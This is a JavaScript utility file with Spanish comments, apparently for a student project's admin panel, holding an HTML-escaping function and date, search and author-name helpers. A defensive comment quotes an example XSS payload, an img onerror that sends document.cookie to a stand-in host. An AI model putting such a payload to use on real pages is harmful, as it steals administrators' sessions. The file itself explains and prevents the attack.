// ============================================================================
//  util.js  —  las funciones chicas que usan TODAS las pantallas.
//  Panel web de NeuroDesk AI. Autor: Martin.
//
//  Este archivo NO importa nada (ni Firebase ni el DOM): son funciones puras.
//  Por eso se pueden probar con node, sin navegador y sin red.
//
//  La mas importante de este archivo es esc(). Leer el comentario largo de
//  abajo antes de tocar cualquier pantalla: es la unica defensa que tiene el
//  panel contra un XSS, y en un panel de ADMIN un XSS es lo peor que puede
//  pasar (el que lo sufre es justo el que tiene todos los permisos).
// ============================================================================


// ----------------------------------------------------------------------------
// esc()  —  escapa texto ANTES de meterlo en innerHTML.
//
// POR QUE EXISTE ESTA FUNCION (esto hay que saber decirlo en la defensa oral):
//
// Las tablas del panel se arman con template strings y innerHTML, porque es la
// forma mas corta y mas legible de dibujar 200 filas sin traer una libreria.
// El problema es que innerHTML NO muestra texto: PARSEA HTML. Si un item se
// llama:
//
//     <img src=x onerror="fetch('https://malo.example/'+document.cookie)">
//
// y lo pegamos crudo en la tabla, el navegador del ADMIN ejecuta ese codigo.
// Y ese titulo lo puede escribir CUALQUIER miembro del workspace desde la app
// Flutter: las reglas de Firestore validan que el titulo sea un string de 1 a
// 140 caracteres, no que sea "inofensivo". O sea: el dato que llega de
// Firestore es dato de OTRA persona, y se trata como HOSTIL siempre.
//
// REGLA DURA DEL PANEL: TODO valor que venga de Firestore o del backend y que
// termine adentro de un template string pasa por esc(). Sin excepciones, ni
// siquiera para el email o para un numero. Si algun dia hay una fila rara en
// la tabla, el primer lugar donde mirar es si a alguien se le escapo un ${}
// sin esc().
//
// Los reemplazos van en ESTE orden y el & va PRIMERO: si escapamos el < antes
// que el &, despues el & de '&lt;' se volveria '&amp;lt;' y se veria el codigo
// en pantalla. Es el error clasico de escribir esta funcion apurado.
//
// Con las comillas escapadas (&quot; y &#39;) tambien es seguro usar el
// resultado adentro de un atributo, SIEMPRE Y CUANDO el atributo este entre
// comillas: title="${esc(x)}" es seguro, title=${esc(x)} NO lo es.
//
// Lo que esc() NO cubre (para que no nos confiemos de mas):
//   - poner un valor de Firestore adentro de un <script> o de un onclick=;
//   - usarlo como href="${...}" (ahi haria falta chequear que arranque con
//     http:// o https://, porque javascript:alert(1) sigue siendo un href
//     valido y esc() no lo toca). En el panel no dibujamos ningun href que
//     venga de la base; si algun dia hace falta, se agrega urlSegura().
// ----------------------------------------------------------------------------
export function esc(valor) {
  // null, undefined y los campos que todavia no escribio el backend
  // (texto, errorMsg, cantChunks...) se dibujan como cadena vacia.
  if (valor === null || valor === undefined) return '';

  return String(valor)
    .replaceAll('&', '&amp;')   // primero el &, si no se rompen los de abajo
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')  // para poder usarlo dentro de atributo="..."
    .replaceAll("'", '&#39;');
}


// ----------------------------------------------------------------------------
// aFecha()  —  normaliza cualquier cosa que Firestore nos devuelva como fecha.
//
// OJO CON ESTO, es una trampa real del proyecto y no un detalle:
// cuando el cliente (la app o el panel) crea un documento con
// FieldValue.serverTimestamp(), el onSnapshot LOCAL se dispara AL INSTANTE con
// creadoEn = null, porque el servidor todavia no le puso la hora. Un segundo
// despues llega la confirmacion y el campo aparece.
// Si la tabla hace ts.toDate() sin chequear, se rompe justo en el momento mas
// visible de la demo: cuando alguien sube algo delante del profesor.
// Por eso todas las fechas pasan por aca y "todavia no tengo fecha" es un
// estado normal, no un error.
// ----------------------------------------------------------------------------
export function aFecha(valor) {
  if (!valor) return null;
  // Timestamp de Firestore (el caso normal): tiene el metodo toDate().
  if (typeof valor.toDate === 'function') return valor.toDate();
  // Date ya armado, o un ISO string si algun dia viene del backend por HTTP.
  if (valor instanceof Date) return valor;
  const d = new Date(valor);
  return isNaN(d.getTime()) ? null : d;
}


// ----------------------------------------------------------------------------
// fechaCorta()  —  "14/09 13:42". Formato argentino (dia/mes), 24 horas.
// Si todavia no hay fecha del servidor, devuelve un guion y no rompe nada.
// ----------------------------------------------------------------------------
export function fechaCorta(valor) {
  const d = aFecha(valor);
  if (!d) return '—';
  const dosDigitos = (n) => String(n).padStart(2, '0');
  return `${dosDigitos(d.getDate())}/${dosDigitos(d.getMonth() + 1)} ` +
         `${dosDigitos(d.getHours())}:${dosDigitos(d.getMinutes())}`;
}


// ----------------------------------------------------------------------------
// haceCuanto()  —  "hace 3 min", "hace 2 h", "hace 5 d".
// Se usa en el title="" de la celda de fecha: la tabla muestra la fecha exacta
// y al pasar el mouse se ve el tiempo relativo, que es lo que uno quiere
// mirar cuando un item quedo colgado en 'procesando'.
// ----------------------------------------------------------------------------
export function haceCuanto(valor) {
  const d = aFecha(valor);
  if (!d) return 'recién (esperando la hora del servidor)';

  const seg = Math.floor((Date.now() - d.getTime()) / 1000);
  if (seg < 60)     return 'hace unos segundos';
  const min = Math.floor(seg / 60);
  if (min < 60)     return `hace ${min} min`;
  const hs = Math.floor(min / 60);
  if (hs < 24)      return `hace ${hs} h`;
  const dias = Math.floor(hs / 24);
  return `hace ${dias} d`;
}


// ----------------------------------------------------------------------------
// diaCorto()  —  "14/09". Etiqueta de las barras del grafico del dashboard.
// ----------------------------------------------------------------------------
export function diaCorto(fecha) {
  const dosDigitos = (n) => String(n).padStart(2, '0');
  return `${dosDigitos(fecha.getDate())}/${dosDigitos(fecha.getMonth() + 1)}`;
}


// ----------------------------------------------------------------------------
// normalizar()  —  para el buscador de la tabla de items.
// Pasa a minusculas y saca los acentos, asi buscar "cronograma" encuentra
// "Cronograma", y buscar "matematica" encuentra "Matemática".
// El truco del normalize('NFD') + regex separa la letra de su tilde y despues
// borra la tilde suelta. Es una linea, no hace falta ninguna libreria.
// ----------------------------------------------------------------------------
export function normalizar(texto) {
  return String(texto ?? '')
    .toLowerCase()
    .normalize('NFD')
    .replace(/[\u0300-\u036f]/g, ''); // ese rango = los acentos sueltos
}


// ----------------------------------------------------------------------------
// uidCorto()  —  un uid de Firebase mide 28 caracteres y no le dice nada a
// nadie. Queda SOLO para la lista de Miembros, cuando a un miembro que SI esta
// en el equipo le falta el nombre (un doc roto). Para mostrar al AUTOR de algo
// se usa nombreDeAutor(), que sabe de la gente que ya se fue.
// ----------------------------------------------------------------------------
export function uidCorto(uid) {
  if (!uid) return 'desconocido';
  return String(uid).slice(0, 6) + '…';
}


// ----------------------------------------------------------------------------
// nombreDeAutor()  —  "quien hizo esto", con la regla que comparten TODAS las
// piezas del proyecto (la app, el panel y el servidor dicen lo mismo):
//
//   1) members/{uid}.nombre                 -> "Camila Duarte"
//   2) si no esta: workspaces/{wsId}.exMiembros[uid].nombre
//                                           -> "Lucas (ya no está en el equipo)"
//   3) si tampoco:                          -> "Ex integrante"
//
// POR QUE EXISTE exMiembros: cuando el admin saca a alguien, el servidor borra
// su ficha de members, pero sus items SE QUEDAN en el espacio (el conocimiento
// es del equipo). Antes, la tabla mostraba un uid cortado ("uid_se…") y parecia
// un error. Ahora el servidor guarda el nombre ANTES de borrar la ficha: es la
// "memoria que no se va". Los que se fueron antes de ese cambio no tienen el
// nombre guardado y salen como "Ex integrante": no inventamos nada.
//
// Recibe los dos mapas ya leidos (no lee Firestore): asi se puede probar con
// node sin red, y las pantallas lo llaman 200 veces por tabla sin costo.
//
// Object.hasOwn y no mapa[uid] a secas: un uid raro como 'constructor'
// devolveria una funcion heredada del objeto y se dibujaria el codigo.
// ----------------------------------------------------------------------------
export function nombreDeAutor(uid, nombrePorUid, exMiembros) {
  const clave = String(uid ?? '');

  if (clave && nombrePorUid && Object.hasOwn(nombrePorUid, clave)) {
    const nombre = nombrePorUid[clave];
    if (typeof nombre === 'string' && nombre.trim()) return nombre.trim();
  }

  if (clave && exMiembros && Object.hasOwn(exMiembros, clave)) {
    const ex = exMiembros[clave];
    if (ex && typeof ex.nombre === 'string' && ex.nombre.trim()) {
      return `${ex.nombre.trim()} (ya no está en el equipo)`;
    }
  }

  return 'Ex integrante';
}


// ----------------------------------------------------------------------------
// plural()  —  "1 persona" / "3 personas". Mejor que "3 persona(s)", que es
// como escribe una maquina y no una persona.
// ----------------------------------------------------------------------------
export function plural(n, uno, varios) {
  return `${n} ${n === 1 ? uno : varios}`;
}
